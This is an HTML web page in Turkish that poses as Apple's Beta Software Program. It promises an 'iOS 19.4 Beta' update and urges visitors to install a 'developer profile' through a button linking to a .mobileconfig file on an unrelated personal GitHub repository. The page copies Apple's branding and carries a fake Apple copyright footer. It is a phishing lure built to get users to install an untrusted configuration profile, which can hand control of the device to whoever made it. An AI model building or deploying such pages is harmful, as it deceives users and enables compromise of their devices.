<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple Beta Software Program</title>
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="white">
    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">

    <style>
        /* APPLE RESMİ STİLLERİ (YAZI TİPLERİ, RENKLER) */
        :root {
            --apple-blue: #007aff;
            --apple-bg: #fff;
            --apple-text: #1d1d1f;
            --apple-subtext: #86868b;
        }

        body { 
            background-color: var(--apple-bg); 
            color: var(--apple-text); 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            margin: 0; padding: 0;
            display: flex; flex-direction: column; height: 100vh;
        }

        /* HEADER (Apple Menüsü Taklidi) */
        header {
            background-color: rgba(0, 0, 0, 0.8);
            color: #fff; padding: 10px;
            font-size: 20px; text-align: center;
            font-weight: bold;
        }

        /* ANA İÇERİK */
        .main-content {
            flex: 1; display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            text-align: center; padding: 20px;
        }

        .apple-logo-main {
            width: 70px; height: 70px;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 32px; font-weight: 700;
            letter-spacing: -0.5px; margin: 0 0 10px 0;
        }

        h2 {
            font-size: 22px; font-weight: 400;
            color: var(--apple-subtext); margin: 0 0 40px 0;
            max-width: 80%;
        }

        /* RESMİ APPLE BUTONU */
        .btn-apple {
            background-color: var(--apple-blue);
            color: #fff; text-decoration: none;
            padding: 18px 45px; border-radius: 980px;
            font-weight: 600; font-size: 17px;
            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
            transition: background-color 0.2s, transform 0.1s;
        }

        .btn-apple:hover { background-color: #0062cc; }
        .btn-apple:active { transform: scale(0.97); }

        /* FOOTER */
        footer {
            background-color: #f5f5f7; color: #6e6e73;
            padding: 20px; font-size: 12px;
            text-align: center; border-top: 1px solid #d2d2d7;
        }
    </style>
</head>
<body>

    <header> Apple Beta Program</header>

    <div class="main-content">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="apple-logo-main">
        <h1>iOS 19.4 Beta Güncellemesi</h1>
        <h2>Cihazınızın performansını ve pil ömrünü artırmak için gerekli geliştirici profilini yükleyin.</h2>
        
        <a href="https://raw.githubusercontent.com/keremkero319-del/keross/main/guncelleme.mobileconfig" class="btn-apple">Profili Yükle</a>
    </div>

    <footer>
        Copyright © 2026 Apple Inc. Tüm hakları saklıdır. <br>Gizlilik Politikası | Kullanım Şartları
    </footer>

</body>
</html>
